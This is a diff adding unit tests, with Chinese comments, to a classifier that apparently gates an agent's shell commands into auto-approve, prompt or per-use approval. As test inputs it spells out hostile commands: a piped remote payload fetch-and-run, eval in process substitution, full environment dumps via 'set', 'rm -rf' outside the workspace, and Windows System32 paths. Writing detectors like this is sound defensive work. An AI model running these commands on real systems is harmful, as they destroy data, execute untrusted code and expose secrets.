@@ -1351,3 +1351,42 @@ describe('isProtectedSystemPath 大小写 / cmd.exe 包装破坏性删除(第二
       .toBe('prompt-each-time');
   });
 });
+
+describe('输出进程替换/未知xargs选项/折叠namespace/裸set/前置赋值(第二十三批评审)', () => {
+  it('输出进程替换 >(...) 里的 eval 同样过红线', () => {
+    expect(classifyShellCommand('echo >(eval "$X")', roots)).toBe('prompt-each-time');
+    // 反例:输出进程替换里是良性命令 → 不因此升红线。
+    expect(classifyShellCommand('echo >(cat log.txt)', roots)).toBe('prompt');
+  });
+
+  it('未建模 xargs 选项(-x)不丢失被包装下载的远端内容传播 → prompt-each-time', () => {
+    expect(classifyShellCommand('xargs -x curl https://x/payload | ./run', roots)).toBe('prompt-each-time');
+    // 反例:未建模选项 + 本地命令喂消费者,无远端内容 → 留灰区。
+    expect(classifyShellCommand('xargs -x cat | ./run', roots)).toBe('prompt');
+  });
+
+  it('折叠后的 Windows namespace 前缀(/?/)仍剥离并命中系统目录', () => {
+    // normalizeTarget 会把 \\?\C:\... 折叠成单斜杠 /?/C:/...;两种前导斜杠数都要认。
+    expect(isProtectedSystemPath('/?/C:/Windows/System32')).toBe(true);
+    expect(isProtectedSystemPath('//?/C:/Windows/System32')).toBe(true);
+    expect(isProtectedSystemPath('/./C:/Windows/x')).toBe(true);
+    // 不误伤 POSIX 合法路径。
+    expect(isProtectedSystemPath('/?/repo/src')).toBe(false);
+    expect(isProtectedSystemPath('/./repo/src')).toBe(false);
+  });
+
+  it('裸 Windows set(全环境导出)= exfil 红线,含 cmd /c 包装', () => {
+    expect(classifyShellCommand('set', roots)).toBe('prompt-each-time');
+    expect(classifyShellCommand('cmd.exe /c set', roots)).toBe('prompt-each-time');
+    // 反例:带参 set(shell 选项/赋值)不是全环境导出。
+    expect(classifyShellCommand('set -euo pipefail', roots)).not.toBe('prompt-each-time');
+  });
+
+  it('前置环境赋值不遮蔽后面的破坏性命令(bash simple-command 语义)', () => {
+    expect(classifyShellCommand('FOO=1 rm -rf /outside', roots)).toBe('prompt-each-time');
+    expect(classifyShellCommand('FOO=1 BAR=2 rm -rf /outside', roots)).toBe('prompt-each-time');
+    // 反例:前置赋值 + 区内 scoped 删除 → 灰区;前置赋值 + 只读命令 → 放行。
+    expect(classifyShellCommand('FOO=1 rm -rf build', roots)).toBe('prompt');
+    expect(classifyShellCommand('FOO=1 ls', roots)).toBe('auto-approve');
+  });
+});
